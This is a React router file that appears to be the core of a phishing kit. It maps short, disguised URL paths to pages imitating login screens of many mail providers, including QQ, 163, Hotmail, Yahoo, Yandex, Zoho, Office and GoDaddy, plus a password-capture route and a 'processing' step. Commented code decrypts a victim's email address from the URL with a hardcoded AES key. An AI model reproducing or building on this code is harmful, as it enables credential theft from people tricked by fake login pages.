
import { Router } from "@reach/router";
import React, { Fragment } from "react";
import { ToastContainer } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import Page126 from "./pages/126";
import Page163 from "./pages/163";
import Page263 from "./pages/263";
import Encryption from "./pages/encryption";
import Godaddy from "./pages/godaddy";
import Hinet from "./pages/hinet";
import Hiworks from "./pages/hiworks";
import HomeRedirect from "./pages/home";
import Hotmail from "./pages/hotmail";
import HotmailPassword from "./pages/hotmail/password";
import Mail from "./pages/mail";
import Office from "./pages/office";
import Portal from "./pages/portal";
import Processing from "./pages/processing";
import Qq from "./pages/qq";
import Rackspace from "./pages/rackspace";
import Redirect from "./pages/redirect";
import RedirectNorecord from "./pages/redirectnorecord";
import Webmail from "./pages/webmail";
import WebmailMain from "./pages/webmailmain";
import Yahoo from "./pages/yahoo";
import Yandex from "./pages/yandex";
import Zoho from "./pages/zoho";

var CryptoJS = require("crypto-js");

const serverurl = require("./users.json");

function App() {
  return (
    <Fragment>
      <Router>
        <Redirect default />
        <HomeRedirect path="/" />
        <Encryption path="/enc" />
        <Page163 path="/p163" />
        <Page126 path="/p126" />
        <Hinet path="/hnt" />
        <Qq path="/qaq" />
        <Page263 path="p263" />
        <Godaddy path="gdy" />
        <Hiworks path="hw" />
        <Mail path="ml" />
        <Office path="ofc" />
        <Rackspace path="rsp" />
        <WebmailMain path="wb" />
        <Yahoo path="yh" />
        <Yandex path="yx" />
        <Zoho path="zh" />
        <Hotmail path="ht" />
        <HotmailPassword path="ht/:key" />
        <RedirectNorecord path="/gm" />
        <Processing path="processing" />
        <Portal path="portal" />
      </Router>
      <ToastContainer
        position="top-center"
        autoClose={5000}
        hideProgressBar={false}
        newestOnTop={false}
        closeOnClick
        rtl={false}
        pauseOnFocusLoss
        draggable
        pauseOnHover
      />
    </Fragment>
  );
}

export default App;

/*
<Redirect path={`/:entry/:email`} />

 useEffect(() => {
    const path = window.location.pathname;
    const id = path.substr(1);

    var bytes = CryptoJS.AES.decrypt(id, "ghost94");
    var originalText = bytes.toString(CryptoJS.enc.Utf8);
    console.log(originalText);
    navigate(`/${uuid()}`, { state: { encryptedata: originalText } });
  }, []);
*/
